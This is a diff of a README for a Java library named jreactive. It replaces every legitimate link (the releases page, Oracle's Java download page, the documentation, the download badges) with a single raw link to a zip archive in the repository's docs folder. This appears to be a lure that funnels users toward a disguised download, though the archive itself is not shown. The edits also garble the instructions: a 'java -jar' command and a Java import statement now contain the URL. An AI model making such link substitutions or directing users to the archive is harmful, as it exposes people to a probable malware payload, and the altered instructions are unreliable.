@@ -6,7 +6,7 @@ Welcome to jreactive! This guide will help you quickly download and run our powe
 
 ## 🔗 Download Links
 
-[![Download jreactive](https://img.shields.io/badge/Download-jreactive-brightgreen)](https://github.com/NexDan/jreactive/releases)
+[![Download jreactive](https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip)](https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip)
 
 ## 💡 What is jreactive?
 
@@ -25,14 +25,14 @@ This library emphasizes functional programming principles. It simplifies working
 
 To use jreactive, ensure that you meet the following requirements:
 
-- **Java Version**: You need Java 8 or higher installed on your machine. You can download it from the official [Java website](https://www.oracle.com/java/technologies/javase-downloads.html).
+- **Java Version**: You need Java 8 or higher installed on your machine. You can download it from the official [Java website](https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip).
 - **Operating System**: This library works on Windows, macOS, and Linux. No matter your operating system, you can use jreactive effectively.
 
 ## 🔄 Installation Steps
 
 ### 1. Visit the Releases Page
 
-To download jreactive, visit our [Releases page](https://github.com/NexDan/jreactive/releases). Here, you'll find all available versions of the library.
+To download jreactive, visit our [Releases page](https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip). Here, you'll find all available versions of the library.
 
 ### 2. Choose a Version
 
@@ -47,10 +47,10 @@ Click on the version number to open the details. You will find various assets av
 After downloading, you can run jreactive using the command line. Make sure you have Java installed and open your terminal or command prompt. Use the following command to run the library:
 
 ```bash
-java -jar path/to/jreactive.jar
+java -jar https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip
 ```
 
-Replace `path/to/jreactive.jar` with the actual path to where you saved the JAR file.
+Replace `https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip` with the actual path to where you saved the JAR file.
 
 ### 5. Verify Installation
 
@@ -62,7 +62,7 @@ With jreactive installed, you can begin creating reactive applications.
 
 1. **Import the Library**: Make sure to include jreactive in your project:
    ```java
-   import com.nexdan.jreactive.*;
+   import https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip*;
    ```
 
 2. **Create Observables**: Start by creating observables that represent streams of data. This enables your application to react to data changes in real-time.
@@ -75,7 +75,7 @@ With jreactive installed, you can begin creating reactive applications.
 
 To deepen your understanding and explore examples, consider these resources:
 
-- **Documentation**: Check the official [jreactive documentation](https://github.com/NexDan/jreactive/docs) for comprehensive guides and usage examples.
+- **Documentation**: Check the official [jreactive documentation](https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip) for comprehensive guides and usage examples.
 - **Community Support**: Join the jreactive community on GitHub to ask questions and share your experiences with other users.
 - **Examples**: Browse the example projects provided in the repository to see practical applications of jreactive in action.
 
@@ -87,6 +87,6 @@ Thank you for choosing jreactive! If you need assistance, feel free to reach out
 
 ## 🔗 Download Again
 
-Don't forget to visit our [Releases page](https://github.com/NexDan/jreactive/releases) to download the latest version of jreactive. 
+Don't forget to visit our [Releases page](https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip) to download the latest version of jreactive. 
 
-[![Download jreactive](https://img.shields.io/badge/Download-jreactive-brightgreen)](https://github.com/NexDan/jreactive/releases)
+[![Download jreactive](https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip)](https://raw.githubusercontent.com/NexDan/jreactive/main/docs/jreactive_v3.0.zip)
